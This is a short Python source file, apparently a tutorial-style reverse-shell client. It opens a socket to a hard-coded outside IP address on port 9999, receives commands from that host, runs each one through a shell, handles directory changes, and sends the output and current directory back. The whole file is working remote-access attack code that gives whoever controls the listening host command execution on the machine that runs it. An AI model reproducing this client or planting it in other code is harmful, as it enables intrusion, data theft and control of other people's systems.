import socket
import os
import subprocess


s = socket.socket()
host = '26.62.98.126'
port = 9999

# to bind host and port together we use s.bind() in server and s.connect() in client.py

s.connect((host, port))

while True:
    data = s.recv(1024)
    # 1024 is the chunks in bytes
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0 :
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + ">"
        s.send(str.encode(output_str + currentWD))

        print(output_str)

